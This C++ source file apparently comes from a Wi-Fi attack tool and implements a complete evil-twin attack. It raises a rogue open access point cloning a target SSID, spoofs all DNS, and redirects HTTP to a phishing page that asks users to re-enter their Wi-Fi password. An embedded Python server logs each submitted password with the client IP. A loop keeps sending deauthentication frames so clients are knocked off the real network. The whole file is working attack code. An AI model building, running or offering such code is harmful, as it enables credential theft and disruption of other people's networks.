#include "EvilTwin.h"
#include "PacketEngine.h"
#include "utils/Logger.h"
#include "utils/NetUtils.h"
#include <cstdlib>
#include <chrono>
#include <thread>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <algorithm>

EvilTwin::EvilTwin() {}
EvilTwin::~EvilTwin() { stop(); }

bool EvilTwin::start(const EvilTwinConfig& cfg) {
    if (m_running) stop();
    m_running = true;
    m_apThread     = std::thread(&EvilTwin::setupAP, this, cfg);
    m_deauthThread = std::thread(&EvilTwin::deauthLoop, this, cfg);
    if (cfg.capture_creds)
        m_credThread = std::thread(&EvilTwin::monitorCredentials, this);
    LOG_INFO("Evil Twin started for " + cfg.target_ssid);
    return true;
}

void EvilTwin::stop() {
    m_running = false;
    if (m_apThread.joinable())     m_apThread.join();
    if (m_deauthThread.joinable()) m_deauthThread.join();
    if (m_credThread.joinable())   m_credThread.join();
    cleanup();
}

void EvilTwin::writeHostapdConf(const EvilTwinConfig& cfg, const std::string& apIface) {
    std::ofstream f("/tmp/wifisec_hostapd.conf");
    f << "interface=" << apIface << "\n"
      << "driver=nl80211\n"
      << "ssid=" << cfg.target_ssid << "\n"
      << "hw_mode=g\n"
      << "channel=" << cfg.channel << "\n"
      << "macaddr_acl=0\n"
      << "ignore_broadcast_ssid=0\n"
      << "auth_algs=1\n"
      << "wpa=0\n";
}

void EvilTwin::writeDnsmasqConf(const std::string& apIface) {
    std::ofstream f("/tmp/wifisec_dnsmasq.conf");
    f << "interface=" << apIface << "\n"
      << "dhcp-range=192.168.1.2,192.168.1.254,255.255.255.0,12h\n"
      << "dhcp-option=3,192.168.1.1\n"
      << "dhcp-option=6,192.168.1.1\n"
      << "server=8.8.8.8\n"
      << "log-queries\n"
      << "log-dhcp\n"
      << "address=/#/192.168.1.1\n"; // DNS spoof all to captive portal
}

void EvilTwin::setupAP(const EvilTwinConfig& cfg) {
    // Create virtual AP interface
    std::string cmd;
    cmd = "iw dev " + cfg.interface + " interface add " + m_apIface + " type __ap 2>/dev/null";
    std::system(cmd.c_str());
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    // Configure IP
    cmd = "ip addr add 192.168.1.1/24 dev " + m_apIface + " 2>/dev/null";
    std::system(cmd.c_str());
    cmd = "ip link set " + m_apIface + " up 2>/dev/null";
    std::system(cmd.c_str());

    writeHostapdConf(cfg, m_apIface);
    writeDnsmasqConf(m_apIface);

    // Enable NAT
    std::system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    std::system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null");
    std::system("iptables -A FORWARD -i wlan0_ap -j ACCEPT 2>/dev/null");

    // Redirect HTTP to captive portal
    std::system("iptables -t nat -A PREROUTING -i wlan0_ap -p tcp --dport 80 "
                "-j DNAT --to-destination 192.168.1.1:8080 2>/dev/null");

    // Start hostapd
    std::system("pkill hostapd 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::milliseconds(300));
    std::system("hostapd /tmp/wifisec_hostapd.conf 2>/tmp/wifisec_hostapd.log &");
    std::this_thread::sleep_for(std::chrono::seconds(1));

    // Start dnsmasq
    std::system("pkill dnsmasq 2>/dev/null");
    std::system("dnsmasq -C /tmp/wifisec_dnsmasq.conf 2>/dev/null &");

    if (m_logCb) m_logCb("Rogue AP '" + cfg.target_ssid + "' started on " + m_apIface);
    startWebPortal(cfg);
}

void EvilTwin::startWebPortal(const EvilTwinConfig& cfg) {
    // Simple Python HTTP server with credential capture
    std::string html = R"(<!DOCTYPE html>
<html><head><title>)" + cfg.target_ssid + R"( - Login</title>
<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f0f0;}
.box{background:white;padding:40px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.2);text-align:center;}
input{display:block;width:100%;margin:10px 0;padding:10px;border:1px solid #ddd;border-radius:5px;}
button{width:100%;padding:12px;background:#0066cc;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
</style></head>
<body><div class='box'>
<h2>&#128752; )" + cfg.target_ssid + R"( Network</h2>
<p>Your session has expired. Please re-enter your Wi-Fi password to continue.</p>
<form method='POST' action='/login'>
<input type='password' name='password' placeholder='Wi-Fi Password' required>
<button type='submit'>Connect</button>
</form></div></body></html>)";

    std::ofstream hf("/tmp/wifisec_portal.html");
    hf << html;

    // Python web server for credential capture
    std::string py = R"(
import http.server, urllib.parse, datetime, sys

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(open('/tmp/wifisec_portal.html','rb').read())
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = urllib.parse.parse_qs(self.rfile.read(length).decode())
        pwd = data.get('password',[''])[0]
        with open('/tmp/wifisec_creds.txt','a') as f:
            f.write(f"{datetime.datetime.now()} | {self.client_address[0]} | {pwd}\n")
        self.send_response(302)
        self.send_header('Location','http://connectivitycheck.gstatic.com/generate_204')
        self.end_headers()

http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
)";
    std::ofstream pf("/tmp/wifisec_portal.py");
    pf << py;

    while (m_running) {
        std::system("python3 /tmp/wifisec_portal.py 2>/dev/null &");
        std::this_thread::sleep_for(std::chrono::seconds(60));
        std::system("pkill -f wifisec_portal.py 2>/dev/null");
    }
}

void EvilTwin::deauthLoop(const EvilTwinConfig& cfg) {
    PacketEngine pe(cfg.interface);
    pe.open();
    while (m_running) {
        pe.sendDeauth(cfg.target_bssid, "", 5, 200);
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

void EvilTwin::monitorCredentials() {
    while (m_running) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        std::ifstream f("/tmp/wifisec_creds.txt");
        if (!f.is_open()) continue;
        std::string line;
        while (std::getline(f, line)) {
            if (std::find(m_creds.begin(), m_creds.end(), line) == m_creds.end()) {
                m_creds.push_back(line);
                auto sep1 = line.find(" | ");
                auto sep2 = line.rfind(" | ");
                if (sep1 != std::string::npos && m_credCb) {
                    std::string ip  = line.substr(sep1+3, sep2-sep1-3);
                    std::string pwd = line.substr(sep2+3);
                    m_credCb(ip, pwd);
                    LOG_INFO("Credential captured from " + ip + ": " + pwd);
                }
            }
        }
    }
}

void EvilTwin::cleanup() {
    std::system("pkill hostapd 2>/dev/null");
    std::system("pkill dnsmasq 2>/dev/null");
    std::system("pkill -f wifisec_portal.py 2>/dev/null");
    std::system(("iw dev " + m_apIface + " del 2>/dev/null").c_str());
    std::system("iptables -t nat -F 2>/dev/null");
    std::system("iptables -F FORWARD 2>/dev/null");
    std::system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");
    LOG_INFO("Evil Twin cleaned up");
}
